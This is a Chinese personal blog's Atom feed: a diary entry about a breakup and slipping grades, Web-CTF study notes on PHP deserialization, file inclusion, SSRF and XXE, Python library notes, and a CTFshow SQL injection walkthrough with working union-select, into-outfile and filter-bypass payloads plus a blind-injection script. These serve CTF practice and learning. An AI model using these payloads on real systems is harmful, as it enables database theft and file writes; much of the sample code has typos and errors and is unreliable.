<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://beicheng-maker.github.io/</id>
    <title>Kang Classmate&apos;s Blog</title>
    <updated>2021-01-18T06:08:38.154Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://beicheng-maker.github.io/"/>
    <link rel="self" href="https://beicheng-maker.github.io/atom.xml"/>
    <subtitle>你爱过一个人嘛？</subtitle>
    <logo>https://beicheng-maker.github.io/images/avatar.png</logo>
    <icon>https://beicheng-maker.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Kang Classmate&apos;s Blog</rights>
    <entry>
        <title type="html"><![CDATA[论我是如何利用一年半时间把自己变成了废物]]></title>
        <id>https://beicheng-maker.github.io/post/lun-wo-shi-ru-he-li-yong-yi-nian-ban-shi-jian-ba-zi-ji-bian-cheng-liao-fei-wu</id>
        <link href="https://beicheng-maker.github.io/post/lun-wo-shi-ru-he-li-yong-yi-nian-ban-shi-jian-ba-zi-ji-bian-cheng-liao-fei-wu">
        </link>
        <updated>2021-01-18T01:14:07.000Z</updated>
        <content type="html"><![CDATA[<p>2021年开始了，混子的日子开始重启。</p>
<p>​	    1️⃣我用了19年、20年把自己变成了一个废物（想当初我也是班级里的尖子生💯）以前我的学校长这样<br>
<img src="https://beicheng-maker.github.io//post-images/1610948751669.png" alt="" loading="lazy"></p>
<p>(左上角倒数第二栋楼，想当初我也待过两年)</p>
<p>后来转到了一所乡镇中学⏸（别问为什么，问就是不知道)，在那之后每天上课除了睡觉就是睡觉，不过成绩一直是学校的前十名（因为他们睡了三年，而我只睡了一年❌），后来考上了高中，记得是有两个实验班，我进了其中的一个，（主要因为疫情，试卷出的简单，不然我现在估计在职高）。</p>
<p>​	    2️⃣当时我和她分手是在2020年的三月份左右，当初感觉没什么（没有什么伤心的），慢慢的我发现我离不开她，很喜欢她，并且这种感觉越来越深，去找过她很多次，每次都是同样的回答，当时真的是很难受，也是在那个时候遇到了我大哥一直在开导我（当时也是唯一一个能陪我聊天的人吧），后来带我进入了安全圈（Web安全），在里面认识了很多表哥（对新人很友好）也是一直在带我。就这样混了一年，学习了Web安全的基础部分，Python，PHP的基础。</p>
<p><img src="https://beicheng-maker.github.io//post-images/1610948762777.png" alt="" loading="lazy"><br>
​	(还有一些很基础的部分，不在此一一截图)</p>
<p>​	    3️⃣后悔嘛？最后悔的还是当初为什么要分手，（其实感觉也挺好的，因为这才让我知道了她在我心里有多重要）。</p>
<p>​	    4️⃣上了高中之后，完全没有精力去听一节课，很想她，（她有了男朋友），也许这份思念就这样埋葬在自己的心里了，完全没有了以前的斗志，每一天都一样的颓废度过，在做着同一件事。自然成绩也是一落千丈，班级倒数之列。愿她幸福吧。</p>
<p>​	    5️⃣没有压力，因为以后不打算结婚，更不会谈恋爱（除非她回来）。当一个人失去了欲望的时候，也就失去了对生活的希望吧。生活无望，未来迷茫。</p>
<blockquote>
<p>---------------------------------新年分割线-----------------------------------------</p>
</blockquote>
<p>​	    2021年目标：能躺着过，绝对不站着过，每天混吃等死。</p>
<p>​							继续巩固Web安全基础知识，学习渗透测试知识，学习POC的高质量编写。</p>
<p>​							争取做一名合格的小丑🤡，继续完成日记的编写（目标：先来他个十年再说）</p>
<p>​	    这一年也认识了很多小伙伴，好多大哥哥。</p>
<figure data-type="image" tabindex="1"><img src="https://beicheng-maker.github.io//post-images/1610948770026.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTF 知识点(WEB)]]></title>
        <id>https://beicheng-maker.github.io/post/ctf-zhi-shi-dian-web</id>
        <link href="https://beicheng-maker.github.io/post/ctf-zhi-shi-dian-web">
        </link>
        <updated>2021-01-17T14:18:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="正则匹配">正则匹配</h1>
<p>可回溯 可造成dos</p>
<pre><code class="language-php">&lt;?php
phpinfo();//a.str_repeat('a',1000000)
</code></pre>
<h1 id="反序列化">反序列化</h1>
<p>数据（变量）序列化（持久化）</p>
<p>将一个变量的数据&quot;转换为&quot;字符串，但并不是类型转换，目的是该字符串存储在本地，相反的行为称为反序列化</p>
<p>序列化和反序列化的目的是使得程序见传输对象会更加方便。</p>
<p>序列化</p>
<p>内存数据是稍纵即逝的；</p>
<p>通常，程序执行结束，立即全部销毁。变量所存储的数据，就是内存数据；文件时“持久数据”；</p>
<p>序列化：</p>
<p>就是，将内存的变量数据，“保存”到文件中的持久数据的过程。</p>
<p>简化就是：将内存变为文件；</p>
<pre><code class="language-php">&lt;?php
highlight_file(__FILE__)
class user{
    //变量
    public $age = 0;
    public $name = '';
    //方法
    public function print_data(){
        echo $this-&gt;name.'is'.$this-&gt;age.'years old'
    }
}
//重建对象
$usr = unserialize('O:4:&quot;user&quot;:2:{s:3:&quot;age&quot;;i&quot;18;s:4:&quot;name&quot;;s:3:&quot;Leo&quot;;}');
$usr-&gt;print_data()
?&gt;
</code></pre>
<h2 id="魔术方法">魔术方法</h2>
<pre><code class="language-php">&lt;?php
PHP中把以两个下划线闻开头的方法称为魔术方法(Magic methods)
__construct()，类的构造函数
__sleep()，执行serialize()时，先会调用这个函数
__destruct()，类的析构函数
__wakeup()，执行unserialize()时，先会调用这个函数
__call()，在对象中调用一个不可访问方法时调用
_toString()，类被当成字符串时的回应方法
_callStatic()，用静态方式中调用一个不可访问方法时调用
_invoke()，调用函数的方式调用一个对象时的回应方法
_get()，获得一个类的成员变量时调用
__set_state()，调用var_export()导出类时，此静态方法会被调用。
_set()，设置一个类的成员变量时调用
__clone()，当对象复制完成时调用
_isset()，当对不可访问属性调用isset()或empty()时调用
_autoload()，尝试加载未定义的类
__unset()，当对不可访问属性调用unset()时被调用。
__debugInfo()，打印所需调试信息

 ?&gt;

</code></pre>
<p>注意点</p>
<p>\x00+类名+\x00+变量名 反序列化出来的是private变量</p>
<p>\x00+*+\x00+变量名 反序列化出来的是protected变量</p>
<p>'O:+4'</p>
<p>PHP Bug</p>
<p>简单来说就是当序列化字符串中，如果表示对象属性个数的值大于真实属性个数时就会跳过__wakeup的执行</p>
<h2 id="phar反序列化">phar反序列化</h2>
<p>利用这种方法可以在不使用unserialize()函数的情况下出发PHP反序列化漏洞。</p>
<p>漏洞触发点在使用phar://伪协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Meta data信息会被反序列化</p>
<p>Demo</p>
<pre><code class="language-php">&lt;?php
$phar=new Phar('test.phar');
$phar-&gt;startBuffering();
$phar-&gt;addFromString('test.txt','text');
$phar-&gt;('&lt;?php __HALT_COMPILER();?&gt;');
class AnyClass();
$object = new AnyClass;
$object-&gt;data = 'rips';
$phar-&gt;setMetadata($object);
$phar-&gt;stopBuffering();
?&gt;
</code></pre>
<h1 id="sql注入">SQL注入</h1>
<h2 id="order-by注入">order by注入</h2>
<p>ORDER BY column_name</p>
<p>(select 1,2,3 order by 3 asc)union(select 2,3,4)</p>
<h1 id="文件包含">文件包含</h1>
<p>远程文件包含</p>
<p>后缀名写死用？ 绕过</p>
<p>伪协议</p>
<pre><code class="language-php">file:// 访问本地文件系统
http:// 访问HTTP(s)网址
ftp:// 访问FTP(s)
php:// 访问各个输入/输出流
zlib:// 压缩流
data:// 数据
glob:// 查找匹配的文件路径模式
phar:// php归档
ssh2:// Secure Shell 2
rar:// RAR
ogg:// 音频流
expect:// 处理交互式的流
zip:// 压缩流---访问压缩文件 111.zip(后缀名随意)#1.php

phar://  111.zip(后缀名随意)/111.php

php://filter/convert.base64-encode/resource=index.php

php://input 利用条件allow_url_include=On

对allow_url_fopen 不做要求

php://input可以读取没有处理过的post数据
</code></pre>
<p>session.upload_progress.enabled这个参数在php.ini默认开启，需要手动置为off，如果不是off,就会在上传的过程中生成上传进度文件，它的存储路径可以在phpinfo获取到</p>
<h1 id="php弱类型">PHP弱类型</h1>
<p>intival 函数 转非空数组返回1</p>
<h1 id="ssrf">SSRF</h1>
<p>服务器端请求伪造，利用漏洞伪造服务器端发送请求，从而突破客户端获取不到的数据</p>
<p>相关函数</p>
<p>file_get_contents()</p>
<p>fsockopen()</p>
<p>curl()</p>
<h1 id="xxe系列">XXE系列</h1>
<p>xml外部实体注入漏洞，XXE漏洞发生在XML输入时，没有禁止外部实体的加载，致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描</p>
<p>xxe漏洞出发点往往是上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件</p>
<h2 id="xml基础知识">XML基础知识</h2>
<p>XML指可扩展标记语言</p>
<p>XML被设计用来传输和存储数据</p>
<p>XML语言没有预定义的标签，允许作者定义自己的标签和自己的文档结构</p>
<p>语法规则：</p>
<p>XML文档必须有一个根元素</p>
<p>XML元素都必须有一个关闭标签</p>
<p>XML标签对大小敏感</p>
<p>XML元素必须被正确的嵌套</p>
<p>XML属性值必须加引号</p>
<pre><code class="language-xml">&lt;?xml version='1.0' encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;note&gt;
&lt;to&gt;a&lt;/to&gt;
&lt;from&gt;b&lt;/from&gt;
&lt;heading&gt;c&lt;/heading&gt;
&lt;/note&gt;
</code></pre>
<p>DTD(文档类型定义)</p>
<p>DTD的作用是定义XML文档的合法构建模块</p>
<p>DTD可以在xml文档内生命，也可以外部引用</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Python 常用库]]></title>
        <id>https://beicheng-maker.github.io/post/python-chang-yong-ku</id>
        <link href="https://beicheng-maker.github.io/post/python-chang-yong-ku">
        </link>
        <updated>2021-01-17T14:10:19.000Z</updated>
        <content type="html"><![CDATA[<p><img src="https://beicheng-maker.github.io//post-images/1610949474914.jpg" alt="" loading="lazy"># json</p>
<pre><code>import json
_dic= {&quot;name&quot;:&quot;loop&quot;,&quot;age&quot;:&quot;12&quot;}
s = json.dumps(_dic,indent=2) #转化为一个序列
d = json.loads(s)#转换为一个字典
</code></pre>
<h1 id="beautifulsoup">Beautifulsoup</h1>
<pre><code class="language-python">r=request.get(&quot;https://www.baidu.com&quot;)
doc=r.content
soup=Beautifulsoup(doc) //创建一个对象
soup.prettify() //格式化源码
soup.head //获取head标签
soup.title //获取titile标签
soup.find_all(&quot;p&quot;) //返回所有p标签
soup.find_all(&quot;p&quot;)[0] //取第一个 类似于数组
soup.head.title.string //取标签内容
///
for i in soup.find_all(&quot;a&quot;)
	print i['herf'] //取herf属性的内容
///
soup.find_all(id=&quot;***&quot;)//指定id取标签
soup.find_all(id=&quot;***&quot;).[0]['href'] 取标签里的href内容
soup.find_all(id=True)所有有id的标签
soup.find_all([&quot;a&quot;,&quot;b&quot;]) 取出所有a标签和b标签
soup.find_all(text=&quot;Elsie&quot;)判断有没有Elsie值
soup.find_all(text=re.compile(&quot;sisters&quot;)) 取出sisters属性里的内容
</code></pre>
<h1 id="socket">socket</h1>
<h1 id="multiprocessing-threading">multiprocessing-threading</h1>
<p>线程与进程的区别</p>
<p>1、线程比进程调度速度更快</p>
<p>2、进程能够利用多核</p>
<p>后起之秀：协程</p>
<pre><code class="language-python">import threading
count=0
lock=threading.Lock()
def doAdd():
	global count,lock
	lock.acquire()
	for i in xrange(100):
		count+=1
	lock.release()
for i in range(5):
	threading.Thread(target=doAdd,args=(),name='thread-'+str(i)).start()
time.sleep(2)
print count
</code></pre>
<pre><code class="language-python">import threading
count=0
class Counter(threading,Thread):
	def __init__(self,lock,threadName):
        super(Counter,self).__init__(name=threadName)#一定要是调用父类的初始化函数
        self.lock=lock
        def run(self):
            global count
            self.lock.acquire()
            for i in rang(10000):
                count+=1
      		self.lock.release()
lock=threading.Lock()
for i in rang(5):
    Counter(lock,&quot;thread-&quot;+str(i)).start()
time.sleep(2)
print(count)
</code></pre>
<pre><code class="language-python">threads=[]
for ip in getip():
	t=threaing.Thread(target=scan,args=(ip,))
    threads.appends(t)
n=0
while True:
    if n==len(threads):
        break
    thread=threads[n]
    if threading.activeCount()&lt;2: #一个线程启动
        print('started:'+str(thread))
        thread.start()
    else:
        n=n-1
    n=n+1
    print(n)
</code></pre>
<h1 id="subprocess">subprocess</h1>
<pre><code class="language-python">retcode=subprocess.call(&quot;ls&quot;,&quot;-l&quot;)#call函数可以认为是对popen和wait的分装
retcode=subprocess.call(&quot;ls -l&quot;,shell=True)#shell指定命令行会通过shell来执行，具有更加丰富的用法
retcode=subprocess.check_all(['ls','-l'])#父进程等待子进程完成，返回0检查退出信息，如果returncode不为0，则举出错误
retcode=subprocess.check_output([&quot;ls&quot;,&quot;-l&quot;])#父进程等待子进程完成，返回子进程向标准输出的输出结果，检查退出信息，如果returncode不为0，则会举出错误


&quot;&quot;&quot;
popen更细粒化的调用
不会阻塞主进程，可以调用wait()方法,父进程才会等待
&quot;&quot;&quot;
child=subprocess.Popen(['ping','-c','4','127.0.0.1'])
child=subprocess.Popen('ping -c4 127.0.0.1',shell=True)
child.wait(4)#可以设置超时时长
p=subporcess.Popen(args,stdout=subprocess.POPE,stderr=subprocess.PIPE)
p=subprocess.Popen(args,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)#将错误按照一般返回进行输出
#child对象常用方法
child.pid #返回子进程的pid
child.poll() #检查子进程的状态
child.kill()#终止子进程
child.send_signal()#向进程发送信号
child.terminate()#终止子进程


</code></pre>
<h1 id="image">Image</h1>
<pre><code>from PIL import Image
</code></pre>
<h1 id="queue">Queue</h1>
<pre><code class="language-python">import queue
q=queue.Queue()
for i in range(10):
	q.put(i)
while not q.empty():
	print(q.get())
</code></pre>
<pre><code class="language-python">import queue
import threading
q=queue.Queue()
for i in range(30):
    q.put(i)
def test(q):
    while not q.empty():
     threadingname=threading.current_thread().getName()
    print(threadname,q.get())
for i in range(3):
    t=threadingThread(target=test,args=(q,))
    t.start
        
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ CTF show sql注入]]></title>
        <id>https://beicheng-maker.github.io/post/ctf-show-sql-zhu-ru</id>
        <link href="https://beicheng-maker.github.io/post/ctf-show-sql-zhu-ru">
        </link>
        <updated>2021-01-17T13:33:50.000Z</updated>
        <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://beicheng-maker.github.io//post-images/1610949487800.jpg" alt="" loading="lazy"></figure>
<h2 id="171"><em>171</em></h2>
<p>payload : 99' or 1=1--+</p>
<h2 id="172"><em>172</em></h2>
<p>payload:1' union select 1,(select group_concat(username,password) from ctfshow_user2)--+</p>
<h2 id="173"><em>173</em></h2>
<p>payload:1' union select 1,2,(select group_concat(hex(password)) from ctfshow_user3)--+ 将查出的结果进行hex编码.</p>
<h2 id="174"><em>174</em></h2>
<p>解法1:</p>
<p>payload:1' union select null,(select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(to_base64(password)),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ') from ctfshow_user4)--+</p>
<p>python转换</p>
<pre><code class="language-python">import base64
flag='ZmxhZnumCsnumJOWMzNmRkMynumAmYmInumELTRhNTItODQnumCMynumJnumENzcnumJNjliNDEnumEMzVnumI'
real_flag=''
real_flag=flag.replace('numA','1').replace('numB','2').replace('numC','3').replace('numD','4').replace('numE','5').replace('numF','6').replace('numG','7').replace('numH','8').replace('numI','9').replace('numJ','0')
print(base64.b64decode(real_flag))
</code></pre>
<p>解法2:</p>
<p>1' union select 1,password from ctfshow_user4 into outfile '/var/www/html/huahua.txt'--+</p>
<h2 id="175"><em>175</em></h2>
<p>1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/huahua.txt'--+ 利用outfile将文件直接写入</p>
<h2 id="176">176</h2>
<p>1' union sElect 1,password from ctfshow_user5 into outfile '/var/www/html/huahua.txt'--+ 利用outfile将文件直接写入</p>
<p>大小写过滤</p>
<h2 id="177"><em>177</em></h2>
<p>空格过滤 将上面payload 空格换成/**/即可</p>
<h2 id="178"><em>178</em></h2>
<p>1'or'1'='1'%23</p>
<p>179同上</p>
<h2 id="180"><em>180</em></h2>
<p>'or((id=26))and'1'='1 过滤了所有空格 括号代替绕过</p>
<h2 id="181"><em>181</em></h2>
<pre><code class="language-python">import requests
url=&quot;http://06f99719-3d72-4761-afd6-0403e5f6e1af.chall.ctf.show/select-waf.php&quot;
flagstr = &quot;{abcdefghijklmnopqrstuvwxyz-0123456789}&quot;
flag=''
print('开始运行')
for i in range(1,46):
    if i &lt; 5:
        continue
    for j in flagstr:
        data={
            &quot;tableName&quot;:f&quot;(ctfshow_user)where(substr(pass,{i},1))regexp('{j}')&quot;
        }
        post=requests.post(url,data=data)
        if '$user_count = 1;' in post.text:
            flag+=j
            print(f'flag is flag{'{flag}'})
            break
</code></pre>
]]></content>
    </entry>
</feed>